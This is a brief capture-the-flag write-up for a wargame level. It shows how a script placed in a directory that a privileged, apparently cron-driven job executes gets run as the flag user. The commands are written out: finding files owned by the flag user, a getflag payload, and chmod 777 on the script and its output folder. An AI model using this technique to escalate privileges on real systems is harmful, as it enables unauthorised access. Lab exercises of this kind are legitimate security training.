No readme in this level so i have done a research as level00:

find / -user flag05 2> /dev/null

It gives the resul
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver

cat of one file gives us:

#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done


Thus, it seems that this script exec all scripts in 
/opt/openarenaserver/ and delete them.
SO, I decided to create a simple sh script test.sh containing:

echo `getflag` > /tmp/level05/flag

but how to exec /usr/sbin/openarenaserver ??

After some time, my script test.sh disapeared but no trace of flag file
So the /usr/sbin/openarenaserver  were well executed (dont know how? maybe crontab)

Change chmod 777 /opt/openarenaserver/test.sh
Change chmod 777 /tmp/level05

BOOM !
